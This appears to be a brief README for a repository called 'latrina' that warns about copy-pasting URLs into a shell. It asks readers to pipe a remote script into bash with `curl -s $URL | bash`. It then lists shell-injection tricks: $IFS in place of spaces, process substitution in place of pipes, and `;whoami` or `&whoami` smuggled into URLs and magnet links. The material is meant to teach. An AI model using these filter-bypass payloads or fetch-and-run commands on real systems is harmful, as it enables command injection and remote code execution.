# latrina

* go to https://raw.githubusercontent.com/kusky3/latrina/main/test''/harmless.sh
* read the content
* copy the url  
* run `curl -s $URL | bash` 
* get owned and learn to escape the urls

## url encoding copypaste nightmares 
#### setting string variables without quotes    
`a=('a')`  
#### separating fields without spaces 
`echo$IFS$a`
#### separating fields without spaces or curly brackets
`a=('a');echo$IFS$a`  
`echo$IFS$9a`  
#### piping without pipes  
`wc -l < <(ls)`     
#### starting code execution without ampersand
`curl http://localhost/;whoami`
#### torrent magnets
`aria2c magnet:?xt=urn:btih:test&dn=linux.iso&whoami`
